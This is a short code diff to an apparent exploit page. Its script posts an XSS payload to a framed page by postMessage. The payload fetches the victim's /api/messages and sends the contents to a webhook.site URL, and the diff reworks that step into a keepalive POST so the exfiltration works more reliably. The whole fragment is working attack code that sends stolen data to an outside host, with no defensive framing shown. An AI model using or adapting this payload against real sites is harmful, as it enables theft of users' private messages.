@@ -5,9 +5,15 @@
 <script>
 const WEBHOOK = "https://webhook.site/4fdd6758-a9a4-4aeb-9322-bc636b2e24ed";
 const payload = `<img src=x onerror="
-  fetch('/api/messages').then(r=>r.text()).then(t=>
-    fetch('${WEBHOOK}?d='+encodeURIComponent(t), {mode:'no-cors'})
-  )
+  (async function() {
+    var data = await fetch('/api/messages').then(r=>r.text());
+    await fetch('${WEBHOOK}', {
+      method: 'POST',
+      mode: 'no-cors',
+      keepalive: true,
+      body: data
+    });
+  })();
 ">`;
 document.getElementById('f').onload = function() {
   document.getElementById('f').contentWindow.postMessage({ html: payload }, '*');
